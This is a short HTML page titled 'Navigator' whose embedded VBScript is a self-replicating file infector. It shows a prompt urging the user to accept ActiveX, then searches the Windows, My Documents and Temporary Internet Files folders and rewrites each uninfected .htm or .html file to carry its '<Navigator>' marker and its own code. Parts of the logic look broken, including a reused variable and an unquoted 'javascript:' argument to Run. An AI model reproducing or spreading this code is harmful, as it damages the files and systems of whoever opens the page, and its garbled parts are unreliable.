<Navigator>
<html><head><title>Navigator</title></head><body>
<script language=VBScript>
On Error Resume Next
MsgBox "Please accept the ActiveX",vbinformation,"Internet"
Set slwtnbce=CreateObject("Scripting.FileSystemObject")
Set ejtnbcfk=CreateObject("WScript.Shell")
If err.number=429 Then
ejtnbcfk.Run javascript:location.reload()
Else

kvrjsmyx("C:\WINDOWS")
kvrjsmyx("C:\My Documents")
kvrjsmyx("C:\WINDOWS\Temporary Internet Files\")

End If

Function kvrjsmyx(dir)
If slwtnbce.FolderExists(dir) Then
  Set xwupgmyx=slwtnbce.GetFolder(dir)
  Set xwtodgmy=xwupgmyx.Files
  For each yaaaaaaa in xwtodgmy
    aaaaaaaa=lcase(slwtnbce.GetExtensionName(yaaaaaaa.Name))
    If aaaaaaaa="htm" or aaaaaaaa="html" Then
      Set aaaaaaaa=slwtnbce.OpenTextFile(yaaaaaaa.path,1 ,False)
      if aaaaaaaa.ReadLine <> "<Navigator>" Then
        aaaaaaaa.Close()
        Set aaaaaaaa=slwtnbce.OpenTextFile(yaaaaaaa.path,1 ,False)
        htmorg=aaaaaaaa.ReadAll()
        aaaaaaaa.Close()
        Set aaaaaaaa=document.body.createTextRange
        Set aaaaaaaa=slwtnbce.CreateTextFile(yaaaaaaa.path, True, False)
        aaaaaaaa.WriteLine "<Navigator>"
        aaaaaaaa.Write(htmorg)
        aaaaaaaa.WriteLine aaaaaaaa.htmltext
        aaaaaaaa.Close()
      Else
        aaaaaaaa.Close()
      End If
    End If
  Next
End If
End Function
</script></body></html>
